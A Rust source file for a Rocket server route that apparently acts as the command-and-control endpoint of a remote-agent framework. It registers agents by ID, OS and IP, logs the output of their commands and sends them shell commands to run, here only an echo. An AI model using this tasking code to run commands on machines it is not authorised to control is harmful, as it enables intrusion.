use serde::Serialize;
use std::{net::SocketAddr, time::SystemTime};
use talaria::{
    AgentInstruction, AgentInstructionBody, AgentResponse, AgentResponseBody, PacketHeader,
};

use crate::SharedState;

#[derive(Serialize, Clone, Debug)]
pub struct Agent {
    pub nickname: Option<String>,
    pub id: u64,
    pub os: Option<String>,
    pub ip: SocketAddr,
    pub last_response_send: u64,
    pub last_response_recv: u64,
    pub instruction_history: Vec<AgentInstruction>,
    pub response_history: Vec<AgentResponse>,
}

// Register or update agent in the state
async fn register_or_update(
    state: &rocket::State<SharedState>,
    response: &AgentResponse,
    instruction: &AgentInstruction,
    addr: SocketAddr,
) {
    let mut agents = state.write().await;
    for agent in agents.agents.iter_mut() {
        if agent.id == response.packet_header.agent_id {
            log::info!("Updated Agent {} at {:?}", agent.id, addr);
            agent.last_response_send = response.packet_header.timestamp;
            agent.last_response_recv = current_time();
            agent.response_history.push(response.clone());
            agent.instruction_history.push(instruction.clone());
            return;
        }
    }

    // Add new agent if not found
    agents.agents.push(Agent {
        nickname: None,
        id: response.packet_header.agent_id,
        os: response.packet_header.os.clone(),
        ip: addr,
        last_response_send: response.packet_header.timestamp,
        last_response_recv: current_time(),
        instruction_history: vec![instruction.clone()],
        response_history: vec![response.clone()],
    });
}

// Route to handle agent responses and issue instructions
#[post("/monolith", data = "<input>")]
pub async fn monolith(
    state: &rocket::State<SharedState>,
    remote_addr: SocketAddr,
    input: Vec<u8>,
) -> Vec<u8> {
    let response = AgentResponse::deserialize(&input);
    let packet_body = response.packet_body.clone();

    // Generate an instruction based on the received response
    let instruction = match packet_body {
        AgentResponseBody::CommandResult { stdout, stderr } => {
            log::info!("Command Output:\nstdout: {}\nstderr: {}", stdout, stderr);
            AgentInstruction {
                packet_header: PacketHeader {
                    agent_id: response.packet_header.agent_id,
                    timestamp: current_time(),
                    packet_id: response.packet_header.packet_id,
                    os: None,
                },
                instruction: AgentInstructionBody::Ok,
            }
        }
        _ => AgentInstruction {
            packet_header: PacketHeader {
                agent_id: response.packet_header.agent_id,
                timestamp: current_time(),
                packet_id: response.packet_header.packet_id,
                os: None,
            },
            instruction: AgentInstructionBody::Command {
                command_id: 1, // Example command_id; replace with logic for unique IDs
                command: "echo".into(),
                args: vec!["Hello from server!".into()],
            },
        },
    };

    // Update agent state
    register_or_update(state, &response, &instruction, remote_addr).await;

    // Send instruction back to agent
    AgentInstruction::serialize(&instruction)
}

// Helper to get current time in seconds since UNIX epoch
fn current_time() -> u64 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

pub fn routes() -> Vec<rocket::Route> {
    rocket::routes![monolith]
}
